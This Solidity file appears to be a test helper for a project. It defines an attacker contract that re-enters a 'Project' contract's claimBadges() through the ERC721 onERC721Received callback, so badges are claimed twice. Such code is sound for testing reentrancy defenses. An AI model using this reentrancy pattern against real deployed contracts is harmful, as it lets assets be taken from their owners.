// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.17;

import "../Project.sol";

contract ERC721Attacker {
    // Equals to `bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"))`
    // which can be also obtained as `IERC721Receiver(0).onERC721Received.selector`
    bytes4 private constant _ERC721_RECEIVED = 0x150b7a02;

    bool private attacked;
    Project private victim;

    constructor(Project _victim) {
        victim = _victim;
    }

    function contribute() public payable {
        victim.contribute{value: msg.value}();
    }

    function attack() public {
        victim.claimBadges();
    }

    
    function onERC721Received(address, address, uint256, bytes memory) public returns (bytes4) {
        if(!attacked) {
            attacked = true;
            victim.claimBadges();
        }

        return _ERC721_RECEIVED;
    }
}